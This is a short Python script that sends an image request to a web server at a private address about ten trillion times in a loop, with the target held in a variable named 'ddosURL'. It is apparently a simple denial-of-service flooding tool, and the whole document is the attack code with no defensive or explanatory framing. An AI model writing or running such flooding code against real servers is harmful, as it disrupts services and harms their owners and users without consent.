import urllib.request


ddosURL = "http://192.168.0.101/assets/images/demo/s13.jpg"

for x in range (1,10000000000000):
    req = urllib.request.Request(ddosURL)
    image = urllib.request.urlopen(req).read()
    print(image)